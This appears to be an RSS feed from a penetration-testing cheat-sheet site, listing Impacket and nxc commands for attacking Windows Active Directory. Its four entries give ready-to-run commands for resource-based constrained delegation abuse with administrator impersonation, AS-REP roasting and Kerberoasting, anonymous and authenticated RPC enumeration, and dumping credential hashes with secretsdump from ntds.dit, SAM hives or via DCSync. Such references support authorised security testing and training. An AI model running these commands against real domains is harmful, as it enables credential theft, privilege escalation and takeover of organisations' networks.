channel.title: Impacket on TLDRBins
channel.description: Recent content in Impacket on TLDRBins

item.title: Constrained Delegation
item.description: Abuse #1: RBCD Attack Linux 1. Find delegation # Check delegation sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USER>' -dc-ip <DC> -hashes :<HASH> -k 2. Get a service ticket impacket-getST -spn <SERVICE>/<TARGET_DOMAIN> -impersonate administrator '<DOMAIN>/<USER>' -hashes :<HASH> -self # Check forwardable flag describeTicket.py <TICKET_1>.ccache 3. RBCD Attack # Add delegation impacket-rbcd '<DOMAIN>/<USER>' -hashes :<HASH> -k -delegate-from <USER> -delegate-to <TARGET_1> -action write -dc-ip <DC> -use-ldaps # Check sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USER>' -dc-ip <DC> -hashes :<HASH> -k 4.

item.title: Kerberoasting
item.description: AS_REP Roasting Impacket nxc # Multiple valid usernames impacket-GetNPUsers <DOMAIN>/ -usersfile <USERS_FILE> -no-pass -dc-ip <DC> # Single user without creds impacket-GetNPUsers -no-pass -dc-ip <TARGET> <DOMAIN>/<USER> # Multiple valid usernames nxc ldap <TARGET> -u <USERS_FILE> -p '' --asreproast as_rep_hashes.txt Kerberoasting (From Linux) Impacket nxc # Fix time skew sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> Note: Times skew have to be within 5 minutes in kerberos # Kerberoasting without cred sudo ntpdate -s <DC> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile <USERS_FILE> -dc-host <DC_IP> <DOMAIN>/ nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --kerberoasting kerberoast_hashes.

item.title: RPC
item.description: Remote Procedure Call Tools rpcclient impacket # Connect without creds rpcclient -U '' -N <TARGET> # Connect with creds rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> # Inline execute command rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'querydispinfo' Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup <RID> # Query group member by rid querygroupmem <RID> # Query user by rid queryuser <RID> # Look up a user lookupnames <USER> # Look up by SID lookupsids <SID> impacket-lookupsid '<USER>:<PASSWORD>@<TARGET>'

item.title: secretsdump
item.description: Convert ntds.dit to .sqlite ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite Ref: ntdsdotsqlite With ntds.dit and SYSTEM hive impacket impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With Dcsync right impacket nxc impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>' nxc smb -dc-ip <DC> -u <USER> -H <HASH> --ntds
